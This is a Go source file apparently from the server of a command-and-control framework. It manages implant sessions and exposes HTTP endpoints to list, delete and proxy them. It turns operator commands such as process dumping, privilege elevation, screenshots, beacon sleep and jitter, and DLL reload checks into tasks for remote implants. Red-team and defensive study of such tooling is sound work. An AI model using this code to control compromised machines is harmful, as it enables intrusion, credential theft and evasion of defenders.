package cirrus

import (
	"context"
	"net/http"
	"strconv"
	"strings"
	"sync"

	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const msgNoSession = "session was not found"

var (
	errEmptyFilter    = xerr.New("invalid or empty filter")
	errInvalidSleep   = xerr.New("invalid sleep value")
	errInvalidJitter  = xerr.New("invalid jitter value")
	errInvalidCommand = xerr.New("invalid or unrecognized command")
)

type session struct {
	sync.RWMutex
	s *c2.Session
	j []uint16
	h uint32
}
type sessionManager struct {
	*Cirrus
	sync.RWMutex

	e map[string]*session
}

func (c *Cirrus) newSession(s *c2.Session) {
	if s == nil || s.ID.Empty() {
		return
	}
	n := s.ID.String()
	c.sessions.Lock()
	if _, ok := c.sessions.e[n]; !ok {
		c.sessions.e[n] = &session{s: s, h: s.ID.Hash()}
	}
	c.sessions.Unlock()
	c.sessions.events.publishSessionNew(n)
	s.Receive, s.Shutdown = c.migrateSession, c.shutdownSession
	c.sessionEvent(s, sSessionNew)
}
func (c *Cirrus) session(n string) *session {
	if len(n) == 0 || !isValidName(n) {
		return nil
	}
	c.sessions.RLock()
	v := c.sessions.e[strings.ToUpper(n)]
	c.sessions.RUnlock()
	return v
}
func (s *sessionManager) clearJobs(x *session) {
	if x.Lock(); len(x.j) == 0 {
		x.Unlock()
		return
	}
	s.jobs.Lock()
	for i := range x.j {
		var (
			h     = uint64(x.h)<<16 | uint64(x.j[i])
			j, ok = s.jobs.e[h]
		)
		if !ok {
			continue
		}
		if s.removeJob(j); j.Result != nil {
			j.Result.Clear()
			j.Result = nil
		}
		s.jobs.e[h], j = nil, nil
		delete(s.jobs.e, h)
	}
	s.jobs.Unlock()
	x.j = nil
	x.Unlock()
}
func (c *Cirrus) shutdownSession(s *c2.Session) {
	if s == nil || s.ID.Empty() {
		return
	}
	n := s.ID.String()
	c.sessions.RLock()
	x, ok := c.sessions.e[n]
	if c.sessions.RUnlock(); !ok {
		return
	}
	c.sessions.clearJobs(x)
	c.sessions.Lock()
	c.sessions.e[n] = nil
	delete(c.sessions.e, n)
	c.sessions.Unlock()
	c.events.publishSessionDelete(n)
	c.sessionEvent(s, sSessionDelete)
}
func (c *Cirrus) migrateSession(s *c2.Session, n *com.Packet) {
	if s == nil || n.ID != c2.RvMigrate {
		return
	}
	i := s.ID.String()
	c.sessions.RLock()
	_, ok := c.sessions.e[i]
	if c.sessions.RUnlock(); !ok {
		return
	}
	c.events.publishSessionUpdate(i)
	c.sessionEvent(s, sSessionUpdate)
}
func (s *session) systemTask(c, a string, f *filter.Filter) (*c2.Job, error) {
	if len(c) == 0 {
		return nil, errInvalidCommand
	}
	if len(a) == 0 {
		return s.systemTaskSingle(c, f)
	}
	switch strings.ToLower(c) {
	case "ls":
		if a[0] == '-' && len(a) > 2 {
			// NOTE(dij): Cut out any '-al' force of habit.
			if i := strings.IndexByte(a, 32); i > 0 {
				return s.s.Task(task.Ls(a[i+1:]))
			}
		}
		return s.s.Task(task.Ls(a))
	case "cd":
		return s.s.Task(task.Cwd(a))
	case "chan":
		if len(a) == 0 {
			s.s.SetChannel(true)
			return nil, nil
		}
		switch a[0] {
		case 't', 'T', 'e', 'E', 'y', 'Y', '1':
			s.s.SetChannel(true)
		default:
			s.s.SetChannel(false)
		}
		return nil, nil
	case "sleep":
		if k := strings.IndexByte(a, '/'); k > 0 {
			var (
				w, v   = strings.ToLower(strings.TrimSpace(a[:k])), strings.TrimSpace(a[k+1:])
				d, err = parseSleep(w)
			)
			if err != nil {
				return nil, err
			}
			if len(v) == 0 {
				return s.s.SetSleep(d)
			}
			j, err := parseJitter(v)
			if err != nil {
				return nil, err
			}
			return s.s.SetDuration(d, j)
		}
		d, err := parseSleep(a)
		if err != nil {
			return nil, err
		}
		return s.s.SetSleep(d)
	case "jitter":
		j, err := parseJitter(a)
		if err != nil {
			return nil, err
		}
		return s.s.SetJitter(j)
	case "elevate":
		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 4 {
			return s.s.Task(task.Elevate(&filter.Filter{PID: uint32(i)}))
		}
		return s.s.Task(task.Elevate(filter.I(a)))
	case "procdump":
		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 4 {
			return s.s.Task(task.ProcessDump(&filter.Filter{PID: uint32(i)}))
		}
		return s.s.Task(task.ProcessDump(filter.I(a)))
	case "procname":
		return s.s.Task(task.ProcessName(a))
	case "check-dll":
		return s.s.Task(task.CheckDLL(a))
	case "reload-dll":
		return s.s.Task(task.ReloadDLL(a))
	}
	return nil, errInvalidCommand
}
func (s *session) systemTaskSingle(c string, f *filter.Filter) (*c2.Job, error) {
	switch c {
	case "ls":
		return s.s.Task(task.Ls(""))
	case "ps":
		return s.s.Task(task.ProcessList())
	case "pwd":
		return s.s.Task(task.Pwd())
	case "chan":
		s.s.SetChannel(true)
		return nil, nil
	case "mounts":
		return s.s.Task(task.Mounts())
	case "elevate":
		if f.Empty() {
			return nil, errEmptyFilter
		}
		return s.s.Task(task.Elevate(f))
	case "refresh":
		return s.s.Task(task.Refresh())
	case "rev2self":
		return s.s.Task(task.RevToSelf())
	case "procdump":
		if f.Empty() {
			return nil, errEmptyFilter
		}
		return s.s.Task(task.ProcessDump(f))
	case "screenshot":
		return s.s.Task(task.ScreenShot())
	}
	return nil, errInvalidCommand
}
func (s *sessionManager) httpSessionGet(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	w.WriteHeader(http.StatusOK)
	x.s.JSON(w)
}
func (s *sessionManager) httpSessionsGet(_ context.Context, w http.ResponseWriter, _ *routex.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte{'['})
	if s.RLock(); len(s.e) > 0 {
		var n int
		for _, v := range s.e {
			if n > 0 {
				w.Write([]byte{','})
			}
			v.s.JSON(w)
			n++
		}
	}
	s.RUnlock()
	w.Write([]byte{']'})
}
func (s *sessionManager) httpSessionDelete(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	var v bool
	if c, err := r.Content(); err == nil && len(c) > 0 {
		v = c.BoolDefault("shutdown", false)
	}
	s.s.Remove(x.s.ID, v)
	w.WriteHeader(http.StatusOK)
}
func (s *sessionManager) httpSessionProxyDelete(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n := r.Values.StringDefault("name", "")
	if !isValidName(n) {
		writeError(http.StatusBadRequest, `value "name" cannot be invalid`, w, r)
		return
	}
	j, err := x.s.Task(task.ProxyRemove(n))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "proxy delete "+n)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpSessionProxyPutPost(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n := r.Values.StringDefault("name", "")
	if !isValidName(n) {
		writeError(http.StatusBadRequest, `value "name" cannot be invalid`, w, r)
		return
	}
	var (
		b = c.StringDefault("address", "")
		p = s.profile(c.StringDefault("profile", ""))
	)
	if len(p) == 0 {
		writeError(http.StatusBadRequest, msgNoProfile, w, r)
		return
	}
	if len(b) == 0 {
		writeError(http.StatusBadRequest, `value "address" cannot be empty`, w, r)
		return
	}
	var (
		j   *c2.Job
		err error
	)
	if r.IsPost() {
		j, err = x.s.Task(task.ProxyReplace(strings.ToLower(n), b, p))
	} else {
		j, err = x.s.Task(task.Proxy(strings.ToLower(n), b, p))
	}
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "proxy add|mod "+n+" "+b+" "+p.String())
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
